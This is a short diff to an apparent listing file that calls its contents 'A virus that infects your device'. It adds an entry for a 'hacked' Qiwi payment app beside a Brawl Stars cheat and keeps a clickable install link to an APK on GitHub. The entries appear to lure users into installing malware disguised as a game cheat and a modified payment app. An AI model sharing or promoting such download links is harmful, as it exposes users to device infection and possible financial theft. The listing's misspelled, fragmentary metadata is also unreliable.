@@ -30,6 +30,9 @@ A virus that infects your device
 
 # BrawlStarsChit
 Name:BrawlStarsChit tipe:ESE version:0.1 tipeV:DV
-(Clickable)
+
+#QiwiHV
+Name:QiwiHakedVersion Tipe:ESE version:0.1 tupeV:DV
 # Install(Clickable):
+# BSC
 https://github.com/rokSkr/FOD/raw/main/BrawlStarsChit2.apk
